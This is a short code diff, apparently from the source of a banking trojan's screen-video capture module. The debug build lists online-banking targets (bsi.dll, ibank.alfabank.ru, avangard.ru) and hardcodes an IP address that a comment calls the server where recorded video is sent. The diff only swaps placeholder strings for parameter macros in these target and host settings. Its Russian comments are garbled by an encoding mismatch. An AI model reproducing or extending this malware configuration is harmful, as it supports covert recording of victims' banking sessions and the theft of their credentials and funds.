@@ -29,9 +29,9 @@ namespace VIDEORECDEBUGSTRINGS
 /// список отлавливаемых адресов. ¬ случае рабочей копии должен заканчиватьс€
 //  двойным нулЄм
 #ifndef DEBUGCONFIG
-	char VIDEO_REC_URLS[MAX_VIDEO_REC_URLS_LEN] = "VIDEO_REC_URLS\0";
+	char VIDEO_REC_URLS[VIDEOREC_PARAM_SIZE_URLS] = VIDEOREC_PARAM_NAME_URLS;
 #else
-	char VIDEO_REC_URLS[MAX_VIDEO_REC_URLS_LEN] = "*bsi.dll*\0"
+	char VIDEO_REC_URLS[VIDEOREC_PARAM_SIZE_URLS] = "*bsi.dll*\0"
 												  "*ibank.alfabank.ru*\0"
 												  "*avangard.ru*\0\0";
 #endif
@@ -45,8 +45,8 @@ namespace VIDEORECDEBUGSTRINGS
 	char VIDEO_REC_HOST2[] = "188.72.202.163";
 #else
 	//јдрес сервера куда пишем видео
-	char VIDEO_REC_HOST1[MAX_VIDEO_REC_HOST_LEN] = "VIDEO_REC_HOST\0";
-	char VIDEO_REC_HOST2[MAX_VIDEO_REC_HOST_LEN] = "VIDEO_REC_HOST\0";
+	char VIDEO_REC_HOST1[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST1;
+	char VIDEO_REC_HOST2[VIDEOREC_PARAM_SIZE_HOST] = VIDEOREC_PARAM_NAME_HOST2;
 #endif
 
 
